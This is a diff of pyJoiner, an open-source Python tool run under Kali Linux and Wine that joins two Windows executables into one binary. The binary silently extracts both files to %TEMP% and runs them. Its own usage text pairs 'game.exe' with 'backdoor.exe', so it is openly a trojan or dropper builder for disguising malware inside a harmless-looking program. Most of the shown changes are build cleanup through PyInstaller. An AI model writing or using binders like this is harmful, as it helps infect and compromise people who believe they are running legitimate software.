@@ -1,11 +1,25 @@
+#!/usr/bin/env python3.4
+#
+# pyJoiner - Kali Linux Version
+# Open Source Exe Joiner
+# Coder: Daniel Henrique Negri Moreno (a.k.a W1ckerMan)
+#
+# pyJoiner is used for join files, similar SFX, but the major difference
+# is that pyJoiner silenty extracts joined files in %TEMP% directory and
+# execute them.
+# 
+# After process, /root/pyJoiner_output/py_file.exe will be generated. 
+# The output py_file.exe file must be execute under Windows platform.
+# 
+#
+# Usage: python3.4 pyJoiner.py
+
 import os, urllib.request
 
 def install_Python_PyInstaller():
     
     pyInstaller = '/root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'
     python_url = 'https://www.python.org/ftp/python/3.4.4/python-3.4.4.msi'
-    if 'amd' in os.popen('uname -r').read():
-        python_url = 'https://www.python.org/ftp/python/3.4.4/python-3.4.4.amd64.msi'
     python_directory = '/root/.wine/drive_c/Python34'
     python_tmp = '/tmp/python-3.4.4.msi'
 
@@ -14,10 +28,7 @@ def install_Python_PyInstaller():
         print('Making download and installation of Python 3.4.4')
         print('Please waiting...')
         urllib.request.urlretrieve(python_url, python_tmp)
-        if 'amd' in os.popen('uname -r').read():
-            os.system('wine64 msiexec /i %s' %python_tmp)
-        else:
-            os.system('wine msiexec /i %s' %python_tmp)
+        os.system('wine msiexec /i %s' %python_tmp)
         print('Python installation done!')
         print('Removing', python_tmp)
         os.remove(python_tmp)
@@ -27,10 +38,7 @@ def install_Python_PyInstaller():
         print('PyInstaller was not installed in', pyInstaller)
         print('Making download and installation of PyInstaller')
         print('Please waiting...')
-        if 'amd' in os.popen('uname -r').read():
-            os.system('wine64 /root/.wine/drive_c/Python34/Scripts/pip.exe install pyinstaller')
-        else:
-            os.system('wine /root/.wine/drive_c/Python34/Scripts/pip.exe install pyinstaller')
+        os.system('wine /root/.wine/drive_c/Python34/python.exe /root/.wine/drive_c/Python34/Scripts/pip.exe install pyinstaller')
         print('PyInstaller installation done!')
         print()
 
@@ -65,7 +73,7 @@ def banner():
 #                                                                        # 
 # How to use pyJoiner?                                                   #
 #                                                                        #
-# e.g: "game.exe" is your first file. Plese type "game.exe" when         #
+# e.g: "game.exe" is your first file. Please type "game.exe" when         #
 # pyJoiner ask you "1st file: "                                          #
 # "backdoor.exe" is your second file. Please type "backdoor.exe" when    #
 # pyJoiner ask you "2nd file: "                                          #
@@ -92,7 +100,6 @@ class file:
         self.name = name
         self.extension = os.path.splitext(self.name)[1]
 
-    @staticmethod
     def create_py_file(file1,file2):
         with open(file1.name, 'rb') as file_n1:
             with open(file2.name, 'rb') as file_n2:
@@ -126,34 +133,20 @@ join(file2, "output_file2", "%s") ''' %( str(file_n1.read()), str(file_n2.read()
                     raise FileExtensionError
 
                 print('Please wait until PyInstaller compile files...')
-                if 'amd' in os.popen('uname -r').read():
-                    os.system('wine64 /root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'
-                              ' --distpath /root/pyJoiner_output'
-                              ' --workpath /root/pyJoiner_output'
-                              ' --specpath /root/pyJoiner_output'
-                              ' --icon %s --windowed --onefile /root/pyJoiner_output/py_file.pyw' %icon)
-                else:
-                    os.system('wine /root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'
-                              ' --distpath /root/pyJoiner_output'
-                              ' --workpath /root/pyJoiner_output'
-                              ' --specpath /root/pyJoiner_output'
-                              ' --icon %s --windowed --onefile /root/pyJoiner_output/py_file.pyw' %icon)
+                os.system('wine /root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'
+                          ' --distpath /root/pyJoiner_output'
+                          ' --workpath /root/pyJoiner_output'
+                          ' --specpath /root/pyJoiner_output'
+                          ' --icon %s --windowed --onefile /root/pyJoiner_output/py_file.pyw' %icon)
                 break
 
             elif wanna_icon == 'n' or wanna_icon == 'no':
                 print('Please wait until PyInstaller compile files...')
-                if 'amd' in os.popen('uname -r').read():
-                    os.system('wine64 /root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'
-                              ' --distpath /root/pyJoiner_output'
-                              ' --workpath /root/pyJoiner_output'
-                              ' --specpath /root/pyJoiner_output'
-                              ' --windowed --onefile /root/pyJoiner_output/py_file.pyw')
-                else:
-                    os.system('wine /root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'
-                              ' --distpath /root/pyJoiner_output'
-                              ' --workpath /root/pyJoiner_output'
-                              ' --specpath /root/pyJoiner_output'
-                              ' --windowed --onefile /root/pyJoiner_output/py_file.pyw')
+                os.system('wine /root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'
+                          ' --distpath /root/pyJoiner_output'
+                          ' --workpath /root/pyJoiner_output'
+                          ' --specpath /root/pyJoiner_output'
+                          ' --windowed --onefile /root/pyJoiner_output/py_file.pyw')
                 break
 
             else:
@@ -162,8 +155,8 @@ join(file2, "output_file2", "%s") ''' %( str(file_n1.read()), str(file_n2.read()
         print('Done! Files are in /root/pyJoiner_output')
 
 
-install_Python_PyInstaller()
 banner()
+install_Python_PyInstaller()
 
 file1 = file(input('1st file: '))
 file2 = file(input('2nd file: '))
